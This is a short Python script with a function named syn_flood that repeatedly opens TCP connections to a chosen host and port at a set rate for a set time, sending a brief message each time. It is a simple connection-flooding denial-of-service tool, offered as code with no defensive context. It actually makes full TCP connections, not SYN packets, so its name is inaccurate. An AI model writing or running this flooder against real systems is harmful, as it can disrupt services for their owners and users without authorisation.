import socket
import time
import random

def syn_flood(target_ip, target_port, duration, rate):
    # Uses Python sockets to repeatedly connect (TCP) to the target at a specified rate.
    print(f"[INFO] Starting TCP flood on {target_ip}:{target_port} for {duration}s at ~{rate} conn/s.")
    start_time = time.time()
    connection_count = 0

    while True:
        if time.time() - start_time > duration:
            break

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((target_ip, target_port))
            s.sendall(b"Attack testing connection.\n")
            s.close()
            connection_count += 1
        except:
            pass

        time.sleep(1 / rate)

    print(f"[INFO] TCP flood completed. Total connections attempted: {connection_count}")
